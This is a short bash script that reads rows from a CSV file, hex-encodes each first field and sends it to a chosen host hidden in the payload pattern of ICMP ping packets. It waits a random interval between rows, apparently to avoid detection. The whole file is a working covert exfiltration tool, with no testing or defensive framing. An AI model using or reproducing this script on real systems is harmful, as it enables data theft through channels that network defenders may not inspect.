#!/bin/bash
 
csv_file="$1"
host="$2"
 
str_to_hex() {
    printf '%s' "$1" | od -An -t x1 | tr -d ' \n'
}

#imeout 15 ping -4 -c 6 $host 
#status=$?

#if [ $status -eq 124 ]; then
#        echo "$host is probably unpingable..."
#elif [ $status -ne 0 ]; then
#	echo "command failed with status: $status"
#else
  while IFS=, read -r field1 field2
  do
    echo "Field 1: $field1"
    hex_string=$(str_to_hex "$field1")
    #ping -c $((RANDOM % 12)) -p "$hex_string" $host
    echo ping -c 6 -p "$hex_string" $host
    ping -c 6 -p "$hex_string" $host
    sleep $((RANDOM % 30))
  done < "$csv_file"
#fi
exit 0
